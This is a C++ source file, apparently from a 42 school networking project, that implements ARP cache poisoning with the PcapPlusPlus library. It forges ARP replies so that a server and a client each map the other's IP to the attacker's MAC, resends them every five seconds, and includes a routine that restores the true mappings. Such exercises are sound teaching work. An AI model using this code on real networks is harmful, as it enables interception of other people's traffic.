/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   Poisoner.cpp                                       :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: hoannguy <hoannguy@student.42lausanne.c    +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/07/07 23:23:41 by hoannguy          #+#    #+#             */
/*   Updated: 2026/07/09 11:43:04 by hoannguy         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "Poisoner.hpp"

Poisoner::Poisoner(Victims &victims, pcpp::PcapLiveDevice *device) {
	this->poison_mac = device->getMacAddress();
	this->device = device;
	this->stop = false;
	
	pcpp::MacAddress s_mac = victims.get_Mac(SERVER);
	pcpp::IPv4Address s_ip = victims.get_Ip(SERVER);
	pcpp::MacAddress c_mac = victims.get_Mac(CLIENT);
	pcpp::IPv4Address c_ip = victims.get_Ip(CLIENT);
	
	this->poisoned_server_packet = create_packet(poison_mac, s_mac, c_ip, s_ip);
	this->poisoned_client_packet = create_packet(poison_mac, c_mac, s_ip, c_ip);
	this->good_server_packet = create_packet(c_mac, s_mac, c_ip, s_ip);
	this->good_client_packet = create_packet(s_mac, c_mac, s_ip, c_ip);
}

Poisoner::~Poisoner() {

}

pcpp::Packet Poisoner::create_packet(
	pcpp::MacAddress m_src,
	pcpp::MacAddress m_dest,
	pcpp::IPv4Address i_src,
	pcpp::IPv4Address i_dest
) {
	pcpp::EthLayer *ethernetLayer = new pcpp::EthLayer(m_src, m_dest);
	pcpp::ArpLayer *arpLayer = new pcpp::ArpLayer(pcpp::ArpReply(m_src, i_src, m_dest, i_dest));
	pcpp::Packet newPacket(100);
	newPacket.addLayer(ethernetLayer, true);
	newPacket.addLayer(arpLayer, true);
	newPacket.computeCalculateFields();
	return newPacket;
}

void Poisoner::poison() {
	while (!this->stop) {
		if (!this->device->sendPacket(&this->poisoned_server_packet))
            throw std::runtime_error("Failed to send poison to server");
        if (!this->device->sendPacket(&this->poisoned_client_packet))
            throw std::runtime_error("Failed to send poison to client");
		std::this_thread::sleep_for(std::chrono::seconds(5));
	}
}

void Poisoner::stop_poison() {
	this->stop = true;
}

void Poisoner::restore() {
	int tries = 3;
	for (int i = 0; i < tries; i++) {
		if (!this->device->sendPacket(&this->good_server_packet))
            throw std::runtime_error("Failed to send restore to server");
        if (!this->device->sendPacket(&this->good_client_packet))
            throw std::runtime_error("Failed to send restore to client");
		std::this_thread::sleep_for(std::chrono::seconds(1));
	}
}
